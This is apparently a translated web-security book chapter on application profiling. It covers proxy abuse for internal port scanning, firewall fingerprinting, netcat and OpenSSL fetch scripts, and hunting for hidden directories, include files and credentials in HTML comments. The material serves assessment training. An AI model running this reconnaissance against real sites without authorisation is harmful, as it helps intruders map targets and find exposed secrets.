一个检查代理是否存在的简单方法，是发送一个 CONNECT 到一个已知的站点，比如 www.google.com，然后观察代理是否会这样做。

注意 很多时候防火墙可能会限制该方法，因此你需要猜测一些内部 IP 地址，用这些地址进行测试。

下面这个例子显示了如何用 CONNECT 方法来连接远程 Web 服务器。

*Request*
CONNECT remote-webserver:80 HTTP/1.0
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 4.0)
Host: remote-webserver .
*Successful Response*
HTTP/1.0 200 Connection established

一般代理请求：另一种可以尝试的方法是插入一个公共的 Web 站点的地址，然后看代理服务器是否返回该 Web 站点的响应。如果确实是这样，这就意味着你可以将该服务器转向到任何你选择的地址。这可以使该代理服务器变成一个公开的匿名代理，更坏的情况是，使得攻击者可以访问你的内部网络，我们将在下面进行演示。对于这一点，一个好的使用方法是尝试识别目标的内部 IP 地址范围，然后对该范围进行端口扫描。

提示 该方法可以同样成功应用在 CONNECT 命令上。

比如，使用该机制对一个标准的公开代理进行测试，发送类似下面这样的请求：

GET http://www.site.com/ HTTP/1.0

你也可以使用该方法扫描网络以获得开放的 Web 服务器

GET http://192.168.1.1:80/ HTTP/1.0
GET http://192.168.1.2:80/ HTTP/1.0

你甚至可以用这种方式进行端口扫描：

GET http://192.168.1.1:80/ HTTP/1.0
GET http://192.168.1.1:25/ HTTP/1.0
GET http://192.168.1.1:443/ HTTP/1.0

##### 检测 Web 应用防火墙

Web 应用防火墙是一种保护设施，内嵌到用户和 Web 服务器之间。应用防火墙分析 HTTP 流量，确定流量是否合法，并尝试阻止 Web 攻击。你可以把它们认为是 Web 应用的入侵防御系统（Intrusion Prevention Systems，IPS）。

在应用评估中，Web 应用防火墙相对来说还是很少见的，但有能力探测出它们仍然非常重要的。下一节中的例子并没有完整地列出 Web 应用防火墙的探测方法，但它们应该为你提供了足够的信息，以便遇到这类防范措施的时候可以确定它们。

要检测出在应用程序前端是否有应用防火墙其实非常简单。在测试中，如果你发送攻击请求时，总是被踢出或者会话超时，那很可能在你和应用程序之间有应用防火墙。另一种推断存在防火墙的依据是 Web 服务器没有回复通常的响应，而是始终返回同样类型的错误。下面列出了一些常见的 Web 应用防火墙和一些探测它们的简单方法。

Teros Teros Web 应用程序防火墙技术会对 TRACE 请求或任何非法的 HTTP 方法做出响应，比如发送 PUT 请求，会出现如下的错误：

TRACE / HTTP/1.0
Host: www.site.com
User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)
HTTP/1.0 500
Content-Type: text/html
<html><head><title>Error</title></head><body>
<h2>ERROR: 500</h2>
Invalid method code<br>
</body></html>

另一个检测出 Teros 的简单方法是检查它们发出的 cookie，其 cookie 类似下面这种形式：

st8id=1e1bcc1010b6de32734c584317443b31.00.d5134d14e9730581664bf5cb1b610784)

当然，Cookie 的值每次都会改变，但是其名字 “st8id” 不会变，而且在大多数情况下，Cookie 的值有类似的字符和长度。

F5 TrafficShield 当你发送异常的请求到 F5 的 TrafficShield 时，你可能会得到含有下列错误的响应信息，举个例子，我们发送不带有任何数据的 PUT 方法。

PUT / HTTP/1.0
Host: www.site.com
User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)
HTTP/1.0 400 Bad Request
Content-Type: text/html

<html><head><title>Error</title></head>
<body><h1>HTTP Error 400</h1>
<h2>400 Bad Request</h2>
The server could not understand your request.<br>Your error ID is: 5fa97729</body></html>

可以看到 TrafficShield 的响应是非常有特点的。

TrafficShield 也拥有与设备一起使用的标准 Cookie，Cookie 的名字是 “ASINFO”，就像下面这个例子的形式：

ASINFO=1a92a506189f3c75c3acf0e7face6c6a04458961401c4a9edbf52606a4c47b1c3253c468fc0dc8501000ttrj40ebDtxt6dEpCBOpiVzrSQ0000

Netcontinuum: 检测一个 Netcontinuum 应用防火墙的部署的方法和其他方法类似，只需要查找它们的 Cookie。在它们的 Cookie 没有被提供的时候，我们注意到该设备对任何非法的请求都响应 404 错误——这和任何一个 Web 服务器都有很大的不同。Netcontinuum 的 Cookie 如下：

NCI___SessionId=009C5f5AQEwIPUC3 /TFm5vMcLX5fjVfachUDSNaSFrmDKZ / LiQEuwC+xLGZ1FAMA+

URLScan

URLScan 是一个免费的 ISAPI 过滤器，为控制 HTTP 请求提供了很好的扩展性。但是我们认为 URLScan 不是一个真正的应用防火墙。类似这样的产品没有提供动态保护，相反，它们依靠一个很长的签名配置文件或者允许的长度来阻止攻击。因为 URLScan 用默认的规则实现，因此检测它非常简单。

比如，默认情况下，URLscan 限制 path 的长度最长为 260 个字符，因此如果你发送一个 path 长度超过 260 个字符的请求，URLscan 会返回 404 错误（http://www.site.com/(261/s)）。如果你在请求中添加下列的任意一个头部，URLscan 也会拒绝该请求，

o translate:

o If:
o Lock-Token:
o Transfer-Encoding:

这将导致 URLScan 返回 404 错误，但是在其他情况下，Web 服务器只会忽略额外的头部，然后正常地响应你发送的请求。

注意 我们在附录 C 中更广泛地介绍了 URLScan 的特征。

SecureIIS SecureIIS 和 URLScan 类似，只不过是添加了好看的用户界面和一些时髦功能的商业版本。它更容易使用，不像 URLScan 那样需要编辑巨大的配置文件。但是要检测出它们，方法几乎是一样的。调查其加载的默认规则，然后突破它们，这会导致 SecureIIS 返回一个拒绝响应，默认设置是 406 的错误代码（注意，老版本允许改变该代码）。

一个默认的规则是限制任何头部的长度最长为 1024 个字符，因此只要把头部值设置成超过该限制，然后看该请求是否被拒绝，就能检测出 SecureIIS。SecureIIS 的默认拒绝页面非常容易辨认：它描述发生了一个安全违例，甚至给出了 SecureIIS 的 logo 和 banner。当然，大多数使用该产品的用户会改变它。观察 HTTP 响应可以得到更多的信息，比如，SecureIIS 对过长的头部会使用少见的 406 “Not Acceptable” 响应。

### 2.2 应用剖析

既然我们已经做好了架构剖析的后勤准备，现在我们可以开始享用调查应用程序本身的大餐了。这可能会是普通而枯燥的工作。但在我们的职业咨询工作中，我们一直感受到这是取得巨大突破的地方。

调查应用程序的目的是生成 Web 站点的完整视图，包括内容、组件、功能，以及流量，从而可以收集关于底层漏洞的线索。尽管自动化漏洞检测工具可以搜索已知的有漏洞的 URL，但是广义的应用程序调查的目的是看如何把各个部分组合在一起。一个恰当的检查可以暴露出应用程序方面的问题，而不只是简单地说明有没有特定的漏洞特征。

粗略地说来，应用剖析比较简单。只需在应用程序各处简单地爬行或者点击，并注意URL以及整个Web站点是如何构架的。如果你经验丰富，应该可以很快确认出站点的编写语言、站点的基本结构、所使用的动态内容等。密切注意调查过程中所暴露的每一个细节，这一点的重要性无论如何强调都不过分。做一个热心的记录者，调查你所发现的每一个细节，因为有可能在一个看起来无关紧要的CCS文件中就包含了宝贵的信息，比如一句指引你到特定应用的注释。

这一节会展示 Web 应用剖析的基本方法，包括如下的关键工作：

##### ☐ 手工检测

○ 搜索引擎

☐ 自动化爬行

☐ 常见 Web 应用剖析

#### 2.2.1 手工检测

通常，为了剖析应用，我们首先做的事情是简单地点击浏览，熟悉站点，寻找所有的菜单，观察 URL 中目录名的变化。

Web 应用是复杂的，它们可能包含了许多文件或者很多组织得很好的目录。因此，以一种有条不紊的方式把应用程序的结构文档化，可以帮你追踪到不安全的页面，并为实施一次有效的攻击提供必要的参考。

##### 应用程序文档化

第一步是打开一个文本编辑器，但更优雅的方法是在类似微软 Excel 的程序中创建一个表格，用来保存应用程序中每个页面的信息。我们建议文档化的东西包括：

页面名称 以字母顺序列出文件，使追溯特定页面的信息更容易。该数据可能会非常的长。

通向页面的完整路径 这是通往页面的目录结构，为了提高效率，你可以把路径和页面名称合并起来。

请求该页面是否需要认证？是或否。

页面是否需要 SSL？页面的 URI 可能是 HTTPS, 但这并不一定意味着页面不能通过普通的 HTTP 访问。用 delete 键删掉这个 “S”！

GET/POST 参数： 记录下传递给页面的参数，许多应用是由一组页面驱动的，这些页面在多个参数上进行操作。

注释： 记录关于页面的个人笔记。比如，是搜索功能，是管理功能还是帮助页面？是否感觉不安全？是否包含私密信息等？这是一个总结性的栏目。

一个完成了一部分的表格看上去可能与表 2-1 差不多。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>Page</td><td style='text-align: center; word-wrap: break-word;'>Path</td><td style='text-align: center; word-wrap: break-word;'>Auth?</td><td style='text-align: center; word-wrap: break-word;'>SSL?</td><td style='text-align: center; word-wrap: break-word;'>GET/POST</td><td style='text-align: center; word-wrap: break-word;'>Comments</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>index.html</td><td style='text-align: center; word-wrap: break-word;'>/</td><td style='text-align: center; word-wrap: break-word;'>N</td><td style='text-align: center; word-wrap: break-word;'>N</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>login.asp</td><td style='text-align: center; word-wrap: break-word;'>/login</td><td style='text-align: center; word-wrap: break-word;'>/N</td><td style='text-align: center; word-wrap: break-word;'>Y</td><td style='text-align: center; word-wrap: break-word;'>POSTpassword</td><td style='text-align: center; word-wrap: break-word;'>Main auth page</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>company.html</td><td style='text-align: center; word-wrap: break-word;'>/about/</td><td style='text-align: center; word-wrap: break-word;'>N</td><td style='text-align: center; word-wrap: break-word;'>N</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>Company info</td></tr></table>

注意 我们会在第 4 章中更多地讨论验证，但现在认识到该方法是非常重要的。同样，只是/main/login.jsp 页面需要验证，这并不意味着所有的页面需要验证。比如，/main/menu.jsp 页面可能不需要验证。在这一步，错误配置开始变得明显。

另一个调查的辅助工具是流程图。流程图可以帮助整理有关站点的信息，并以更清晰的形式展现出来。一个精确的图表有助于形象地展现应用程序的处理流程，并有可能指出设计中的薄弱点或不足。流程图可以是一个在白板上的框图，或者三页流程图，带有颜色标记的方框用来标识静态页面、动态页面、数据库存取流程，以及其他宏功能。许多蜘蛛Web应用程序，比如 WebSphinx，已经有了作图的功能。图 2-2 显示了一个 Web 应用流程图的例子。

 </div>

对于严肃的深入检查，我们推荐将应用程序镜像到你的本地硬盘作为你的文档。你可以用工具自动生成该镜像（我们会在“自动化 Web 爬行工具”一节中简短讨论），或者也可以手工进行操作。最好保持与目标应用一致的目录结构。比如：

www.victim.com
/admin/admin.html
/main/index.html
/menu/menu.asp

提示 根据你所认为的目标站点的改变频率，合理调整在镜像目标站上所耗费的精力。

在表格和流程图中还应该记录的其他一些信息包括:

☐ 静态页面和动态生成页面

○ 目录结构

- 常见文件扩展
- 常见文件
- 帮助文件
- Java 类和 Applets
- HTML 源代码
- 表单
- 查询字符串和参数
- 常见 Cookie
- 后端连接

在接下来的几节中，我们将更详细地讨论每个部分。

##### 静态页面和动态生成页面

静态页面是一般的.html 文件，通常是 FAQ 和联系信息。可能无法对它们进行输入验证测试攻击，但是 HTML 源代码可能包含了注释或者信息。最起码，联系信息也透露了 E-mail 地址和用户名。而动态生成的页面（.asp，.jsp，.php 等）则有趣得多。对有趣的页面，诸如管理员功能，用户基本信息，或者购物车等，记录简短的注释，

就像我们前面提到的那样，当你手工剖析应用程序时，最好把应用程序的结构和内容镜像到本地磁盘上。举个例子，如果 www.victim.com 有一个/include/database.inc 文件，那么创建一个叫做 “www.victim.com” 的顶层目录，以及一个叫做 “include” 的子目录，然后将 database.inc 文件放在 include 目录中。Lynx 是基于文本的浏览器，可以加速这一过程。

[root@meddle ]# mkdir www.victim.com
[root@meddle ]# cd www.victim.com
[root@meddle www.victim.com]# lynx -dump www.victim.com/index.html >
index.html

Netcat 比 Lynx 更好一些，因为它还转储了服务器的头部。

[root@meddle ]# mkdir www.victim.com
[root@meddle ]# cd www.victim.com
[root@meddle www.victim.com]# echo -e "GET /index.html HTTP/1.0\n\n" | \
> nc -vv www.victim.com 80 > index.html
www.victim.com [192.168.33.101] 80 (http) open
sent 27, rcvd 2683: NOTSOCK

为了使该过程更加地自动化（偷懒是美德!），可以为 Netcat 创建一个包装脚本，该脚本可以在 UNIX/Linux 系统和安装了 Cygwin 的 Windows 系统上工作。创建一个叫做 getit.sh 的文件，将其放在你的执行路径中。下面是一个例子，是我们在 Web 安全评估中使用的

getit.sh 脚本。

#!/bin/sh
# mike's getit.sh script
if [-z $1]; then
    echo -e "\n\tUsage: $0 <host> <URL>"
    exit
fi
echo -e "GET $2 HTTP/1.0\n\n" | \
nc -vv $1 80

等一下！这样还不够。Lynx 和 Mozilla 可以处理只能通过 SSL 访问的页面。你能够用 Netcat 做同样的事情吗？答案是：不行。不过，你可以使用 OpenSSL 包。创建第二个名为 `getit.sh` 的文件，记得也要放在可执行路径中。

#!/bin/sh
# mike's sgetit.sh script
if [-z $1]; then
    echo -e "\n\tUsage: $0 <SSL host> <URL>"
    exit
fi
echo -e "GET $2 HTTP/1.0\n\n" | \
openssl s_client -quiet -connect $1:443 2>/dev/null

注意 getit 脚本的强大用途，并不限于两个命令行参数。你可以改动它们，在参数中添加 Cookie、用户代理字符串、主机字符串等等任何的 HTTP 头。而你需要做的，只是改动 “echo -e” 这行代码。

既然你可以在命令行下处理 HTTP 和 HTTPS 了，Web 应用程序沦陷的日子即将来临！因此，不要通过浏览器或运行 Lynx 来保存每个文件，而是要像之前演示的那样，使用 getit 脚本来保存，下面是个例子。

[root@meddle ]# mkdir www.victim.com
[root@meddle ]# cd www.victim.com
[root@meddle www.victim.com]# getit.sh www.victim.com /index.html >
index.html
www.victim.com [192.168.33.101] 80 (http) open
sent 27, rcvd 2683: NOTSOCK
[root@meddle www.victim.com ]# mkdir secure
[root@meddle www.victim.com ]# cd secure
[root@meddle secure]# sgetit.sh www.victim.com /secure/admin.html >
admin.html

OpenSSL s_client 比 Netcat 输出更为冗长的信息，如果一直看着它的输出，很快就让人

感到疲惫了。随着我们不断深入研究 Web 应用,你会发现 getit.sh 和 sgetit.sh 是多么的重要,因此,多使用它们。

只要页面没有发送 POST 请求，你就可以用 `getit` 脚本下载动态生成的页面。这是一个很重要的特性，因为有些页面的内容，会根据它们接收到的参数不同而有很大的变化。下面是另一个例子，这次 `getit.sh` 得到是同样的 menu.asp 页面输出，不过是提供给两个不同的用户的。

[root@meddle main]# getit.sh www.victim.com \
> /main/menu.asp?userID=002 > menu.002.asp
www.victim.com [192.168.33.101] 80 (http) open
sent 40, rcvd 3654: NOTSOCK
[root@meddle main]# getit.sh www.victim.com \
> /main/menu.asp?userID=007 > menu.007.asp
www.victim.com [192.168.33.101] 80 (http) open
sent 40, rcvd 5487: NOTSOCK

记住站点对页面的命名习惯，比如程序员是否省略元音（usrMenu.asp，Upld.asp，hlpText.php）？名字是否冗长（AddNewUser.pl）？脚本功能是否实用（main.asp 是否比瑞士军刀实现的功能还多）？命名习惯深刻地反映了程序员的思维。如果你发现了一个叫做UserMenu.asp 的页面，那么就很可能存在一个叫做 AdminMenu.asp 的页面。调查应用程序的艺术并不仅限于你通过归纳发现了什么，还包括通过很多推理来追踪你的猎物。

##### 目录结构

Web 应用的结构通常具有独特的特征。仔细检查那些看起来微不足道的东西，比如目录结构，文件扩展，对参数名和值的命名习惯等，可以发掘出一些线索，这些线索可以立即识别出是什么应用程序在运行（在后面“常见 Web 应用剖析”一节中，有一些零散的例子）。

获取站点公开部分的目录结构是很容易的。毕竟，应用程序是设计来为了网上冲浪的。但是，不要只是局限于观察浏览器和站点的菜单选择项可见的那部分结构。Web 服务器可能有管理员目录、站点旧版本、备份目录、数据目录，或者其他不会用任何 HTML 代码引用的目录。努力去揣摩管理员和站点程序员的思维，比如，如果静态内容在/html 目录中而动态内容在/jsp 目录中，那么所有的 cgi 脚本可能就在/cgi 目录中。

其他可以检查的常见目录包括:

- 被认为是安全的目录, 不管是通过 SSL, 认证保护的, 还是用隐晦的标识/admin/secure/adm/的目录;

☐ 包含备份文件或日志文件的目录：/.bak/ /backup/ /back/ /log/ /logs/ /archive/ /old/;

○ 私人 Apache 目录：/~root//~bob//~cthulhu/;

☐ 文件包含目录：/include/ /inc/ /js/ /global/ /local/;

☐ 用于国际化的目录：/de//en//1033//fr/。

这一列表并没有设计完整。一个应用程序的完整目录结构，可能会通过/en/来引出站点的英语分支部分。因此，检查/include/会返回一个404错误，但是检查/en/include/就会成功。回头再看一下先前通过手工检查获知的目录和文档，程序员或系统管理员是以什么方式来展现该站点的？在/scripts/目录下发现了/inc/目录吗？如果是这样，接下来试试/scripts/js/或者/scripts/inc/js/。

这是一个费力的过程，但是 getit 脚本会有助于去掉任何目录树。当对服务器上存在的目录发送一个 GET 请求时，Web 服务器会返回一个非 404 的错误代码，代码可能是 200，302 或者 401，但只要不是 404，你就发现了一个目录。这一技术很简单，下面是一个例子。

[root@meddle]# getit.sh www.victim.com /isapi
www.victim.com [192.168.230.219] 80 (http) open
HTTP/1.1 302 Object Moved
Location: http://tk421/isapi/
Server: Microsoft-IIS/5.0
Content-Type: text/html
Content-Length: 148
<head><title>Document Moved</title></head>
<body><h1>Object Moved</h1>This document may be found <a HREF="http://tk-421/isapi/">
here</a></body>sent 22, rcvd 287: NOTSOCK

使用我们信任的 `getit.sh` 脚本，对/isapi/ 目录发送一个请求，但是我们忽略了一个重要的地方，反斜杠被放在目录名称的左边，这导致 IIS 服务器产生了一个对实际目录的重定向。作为一个附带结果，它也暴露了服务器的内部的主机名或 IP 地址（即使服务器是在防火墙或者负载均衡器后方）。Apache 也是同样的受害者，它不会暴露服务器的内部的主机名或 IP 地址，但是它会暴露虚拟服务器，下面是一个例子。

[root@meddle]# getit.sh www.victim.com /mail
www.victim.com [192.168.133.20] 80 (http) open
HTTP/1.1 301 Moved Permanently
Date: Wed, 30 Jan 2002 06:44:08 GMT
Server: Apache/2.0.28 (Unix)
Location: http://dev.victim.com/mail/
Content-Length: 308
Connection: close
Content-Type: text/html; charset=iso-8859-1
<!DOCTYPE HTML PUBLIC --//IETF//DTD HTML 2.0//EN">
<html><head>

<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://dev.victim.com/mail/">here</p>
<a></p>
<hr />
<address>Apache/2.0.28 Server at dev.victim.com Port 80</address>
</body></html>
sent 21, rcvd 533: NOTSOCK

就是这样！如果目录不存在，你就会收到一个 404 错误，否则，就沿着这条目录树继续前进吧。

##### 常见文件扩展名

文件扩展名是应用程序特征的很好的指示器，文件扩展名可以用来确定文件的类型，包括语言类型和应用程序类型。文件扩展名也告诉 Web 服务器是如何处理文件的。一些扩展名的文件是可执行的，而另外一些只是模板文件。下面的列表中包含了在 Web 应用中常见的扩展名和它们的应用程序类型。如果你不清楚某个扩展名对应的应用程序类型，只要使用诸如 Google 之类的因特网搜索引擎，搜索该扩展（比如，使用语法 “allinurl:.cfm”），就可以获得其他使用该扩展名的站点，从而帮助你缩小对应的应用程序类型的范围。

提示 另一个用来调查文件扩展名的便利资源是 http://filext.com/，你可以找到某个扩展名对应的应用程序类型。

##### 表 2-2 列出了一些常见文件扩展名和使用它们的典型应用程序或技术。

与常见的 Web 应用软件保持同步：因为评估 Web 应用是我们的工作，我们希望自己尽可能地熟悉流行的 Web 应用。我们总是测试最新的现成/开源 Web 应用。到 www.sourceforge.net 或 www.freshmeat.net 网站，查看排名前 50 位的最流行的免费 Web 应用。它们被广泛地使用在许多应用程序中。只要知道它们的工作方式以及它们给人的感觉，你就可以在访问站点时很快认出它们。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>应用程序/技术</td><td style='text-align: center; word-wrap: break-word;'>常见的文件扩展名</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ColdFusion</td><td style='text-align: center; word-wrap: break-word;'>.cfm</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ASP.NET</td><td style='text-align: center; word-wrap: break-word;'>.aspx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Lotus Domino</td><td style='text-align: center; word-wrap: break-word;'>.nsf</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ASP</td><td style='text-align: center; word-wrap: break-word;'>.asp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>WebSphere</td><td style='text-align: center; word-wrap: break-word;'>.d2w</td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>PeopleSoft</td><td style='text-align: center; word-wrap: break-word;'>.GPL</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>BroadVision</td><td style='text-align: center; word-wrap: break-word;'>.do</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Oracle App Server</td><td style='text-align: center; word-wrap: break-word;'>.show</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Perl</td><td style='text-align: center; word-wrap: break-word;'>.pl</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CGI</td><td style='text-align: center; word-wrap: break-word;'>.cgi</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Python</td><td style='text-align: center; word-wrap: break-word;'>.py</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PHP</td><td style='text-align: center; word-wrap: break-word;'>.php/.php3/.php4</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SSI</td><td style='text-align: center; word-wrap: break-word;'>.shtml</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Java</td><td style='text-align: center; word-wrap: break-word;'>.jsp/.java</td></tr></table>

#### 常见文件

大多数软件的安装程序会带有一些大家熟知的文件，比如：
o Readme
o ToDo
o Changes
o Install.txt
o EULA.txt

在站点的每个文件夹和子文件夹中搜索这些文件，你可能会发现很多有用的信息，比如这些信息可能告诉你站点运行的应用程序的类型和版本，也可能告诉你一个很好的 URL，把你导向到下载该软件和升级版本的页面。如果你没有时间或能力检查每一个文件夹，也至少应该点击站点的根目录，因为在根目录下，这些类型文件通常是存在的（比如，http://www.site.com/Readme.txt）。很多管理员或开发员遵循默认的安装流程，或者把整个安装包内容解压到 Web 根目录下。这些人真是太助人为乐了！

##### 帮助文件

帮助文件（Helper file）是对所有支持应用程序的文件的统称，不过它们通常不出现在URL中。常见的帮助文件是 JavaScript 文件，它们通常采用格式化的 HTML，以适应各种不同的流行浏览器，也可以执行客户端的输入验证。帮助文件包括：

层叠样式表 CSS 文件 (.css) 指示浏览器如何格式化文本，它们很少含有敏感的信息，不过还是要检查一下它们。

XML 样式表 应用程序正逐渐转向用 XML 来进行数据表达，样式表（.xsl）为 XML 请求和格式定义了文档结构。它们正逐渐成为一种宝贵的信息，经常列出数据库字段或者引用其他的帮助文件。

JavaScript 文件 几乎所有的 Web 应用程序都使用 JavaScript（.js）。它们大部分嵌入

在 HTML 文件中，不过也存在单独的 js 文件。应用程序采用 JavaScript 文件来做任何事情，从浏览器定制到会话处理。除了检查这些文件以外，注意到文件所包含的函数类型也是很重要的。

包含文件 在 IIS 系统中，包含文件（.inc）经常用来控制数据库访问，或者包含应用程序内部使用的变量。程序员非常喜欢把数据库连接字符串放在这个文件中，这包含了密码和所有的一切！

##### 其他 在 HTML 源代码中，可能包含了对 ASP, PHP, Perl, text 和其他文件的引用。

URL 很少会直接引用这些文件，因此为了找到它们，你必须转到 HTML 源代码。在服务器端包含指令和脚本标记中寻找这些文件。你可以手动检查页面，或者使用手边的命令行工具。下载此文件并搜索常见的文件后缀和指令试试：

.asp .css .file .htc .htw
.inc <#include> .js .php .pl
<script> .txt virtual .xsl

[root@meddle tb]# getit.sh www.victim.com /tb/tool.php > tool.php
[root@meddle tb]# grep js tool.php
www.victim.com [192.168.189.113] 80 (http) open
var ss_path = "aw/pics/js/"; // and path to the files
document.write("<SCRIPT SRC=''" + ss_machine + ss_path + "stats/ss_main_v-" + v +".js\"></SCRIPT>");

像这样的输出告诉我们两件事情：其一，这里有“aw/pics/js/”和“stats/”两个目录，而之前我们并没有发现；其二，这里有几个 JavaScript 文件，遵循“ss_main_v-*.js”的命令规范，其中星号代表某个数值，对源代码再做更进一步的检查我们就可以知道该值是多少。

你还可以猜测常用的文件名，在前面步骤中列举的文件夹里，再试试下面这些文件名。

global.js local.js menu.js toolbar.js
adovbs.inc database.inc db.inc

同样地，所有的这些搜索不一定要手动完成。我们会在本章后面的“使用搜索工具进行剖析”和“自动化 Web 爬行”两小节中，讨论自动化搜索工具。

##### Java 类和 Applet

在网页源码隐藏数据过滤检测（source-sifting）和调查站点功能时，基于 Java 的应用程序是一种特殊的情况。如果你可以下载 Java 类或者编译好的 Servlet，你就可以真正将一个应用程序从内部分离出来了。如果某个应用程序使用了一个用 Java Servlet 编写的加密方案，现在，假设你可以下载该 Servlet 并能够窥探到代码内部。

在 Web 应用程序中发现 Applet 是非常简单的事情: 只要查找类似下面一样的有 Applet 标识的代码即可:

<applet code = "MainMenu.class" codebase="http://www.site.com/common_console" id = "scroller">
<param name = "feeder" value="http://www.site.com/common/console/CWTR1.txt">
<param name = "font" value = "name=Dialog, style=Plain, size=13">
<param name = "direction" value = "0">
<param name = "stopAt" value = "0">
</applet>

Java 做饭计成一种 “一次编写，随处使用” 的语言。这样做的一个明显附加结果就是，你实际上可以将一个 Java 类反编译为最初的源代码。做这项工作的最好工具是 Java Disassembler，即 jad。用 jad 反编译 Java 类很简单：

[root@meddle]# jad SnoopServlet.class
Parsing SnoopServlet.class... Generating SnoopServlet.jad
[root@meddle]# cat SnoopServlet.jad
// Decompiled by Jad v1.5.7f. Copyright 2000 Pavel Kouznetsov.
// Jad home page:
// http://www.geocities.com/SiliconValley/Bridge/8617/jad.html
// Decompiler options: packimports(3)
// Source File Name: SnoopServlet.java
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Enumeration;
import javax.servlet.*;
import javax.servlet.http.*;
public class SnoopServlet extends HttpServlet
{
    ...remainder of decompiled Java code...

你不必是一个 Java 代码专家，也可以使用该工具。只要能访问站点的内部功能，你就能够检查数据库调用、文件格式、输入验证（或者没有验证），以及服务器的其他功能。

获得真正的 Java 类可能比较困难，但是可以试试下面这些小技巧。

在 Servlet 名称之后添加 .java 或者 .class。比如, 如果站点使用了叫做“/servlet/LogIn”的 Servlet，那么就查找一下“/servlet/LogIn.class”。

在备份目录中搜索 Servlet，如果 Servlet 所在的目录被 Servlet 引擎认为不是可执行的，你可以获得真正的文件而不是接收它的输出。

搜索常见的测试 Servlet，比如 SessionServlet，AdminServlet，SnoopServlet 以及 Test。

要注意许多 Servlet 引擎是大小写敏感的，你需要正确地输入这些名称。

Applet看起来是软件中最不安全的部分。绝大多少开发人员都没有考虑到Applet是很容易被反编译的，而且会泄漏大量信息。Applet本质上是“厚”客户端，包含了与服务器通信所需的所有代码。我们多次看到Applet直接给应用程序发送原始的SQL查询，或者Applet使用特殊的来宾账户完成特定的功能，而用户名和密码就嵌入在代码中。如果看见一个Applet用做敏感类型的操作，我们往往都非常高兴，因为一旦反编译后，十之八九就会发现一些真正的安全问题。如果使用了一些很好的迷惑技术（obfuscation techniques），Applet就不能被反编译，这时可以通过研究与Web服务器的通信流，对Applet进行逆向。大多数Applet遵循浏览器中的代理设置，因此，把它们的值设置成手边代理工具，就可以见到绝大多数Applet的通信。在一些情况下，Applet不会遵循浏览器中的代理设置。此时，古老的经典方法就会有用武之地了，快拿出你的嗅探工具吧。

##### HTML 源代码

HTML 源代码中会包含大量有价值的信息。

HTML 注释 攻击者最容易注意到的地方是 HTML 注释，这是源代码的特殊部分，开发者常常在这里放置备注信息，但这些信息是完全暴露的。字符 “<--” 标记了所有的基本 HTML 注释。

HTML 注释是一种随意性的内容，它们可能很多但没什么信息，或者它们非常少却包含了后来某个 SQL 查询的数据库表的描述，甚至用户密码。

接下来的例子显示了使用 `getit.sh` 脚本获得站点的 index.html 文件，然后用管道将其重定向到 UNIX/Linux 的 grep 命令来查找 HTML 注释。在 Windows 下你可以使用 `findstr` 命令，它和 grep 命令类似。

注意 字符 “!” 在 UNIX/Linux 命令行下有特殊的含义，并且应该避免在 gep 搜索中使用字符 “\”。

[root@meddle ]# getit.sh www.victim.com /index.html | grep "<\！--"
www.victim.com [192.168.189.113] 80 (http) open
<!-- $Id: index.shtml,v 1.155 2002/01/25 04:06:15 hpa Exp $ -->
sent 17, rcvd 16417: NOTSOCK

最起码，该例告诉了我们 index.html 文件实际上是到 index.shtml 的一个链接。扩展名 shtml 意味着该页面的一部分是由服务端包含（Server Side Includes）技术创建的。在剖析应用程序的时候，经常要用到归纳（induction）这种分析方法，所以熟悉一些 Web 技术类型是非常重要的。这里提出一个小测试：在上面的例子中，什么类型的程序会对$Id 中的信息做出响应。

你可以使用这种方法（使用我们的 `getit` 脚本或者你所选的自动化爬行工具）把整个站点的注释转储到一个文件中，然后检查该文件，寻找任何感兴趣的项目。如果你发现了一些看起来有必要研究的东西，可以搜索站点来找到该注释出自的页面，然后仔细地分析该页面，弄明白该注释的上下文含义。这样可以揭示出更有意思的信息，包括：

类似文件名的注释 你会看见模板文件名隐藏在大量的注释中间。下载这些模板文件，并检查模板代码，你可能会有意想不到的收获。

旧代码 寻找被写成注释的链接，它们可能会指向 Web 站点的某个不用的部分，而那部分可能含有安全漏洞。或者，链接可能指向一个曾经运行过的文件，但现在当你尝试访问它时，会显示一个非常有启示作用的错误信息。

日动生成的注释 你看到的很多注释可能是由 Web 内容软件自动生成的。将注释放在搜索引擎中搜索，看还有哪些站点使用了相同的注释，这种方法是非常有用的。你很可能发现是什么软件生成了这些注释，并获得有用的信息。

明显的内容 我们在注释中看到过一些东西，比如整个 SQL 语句，数据库密码和在文件中留给其他开发者的注意事项，比如，IRC 聊天日志等。

其他 HTML 源代码标记 不要只停留在注释标记上，HTML 源代码拥有各种类型的隐藏宝藏，试试搜索下面这些字符串：

SQL Select Insert #include #exec

Password Catabase Connect //

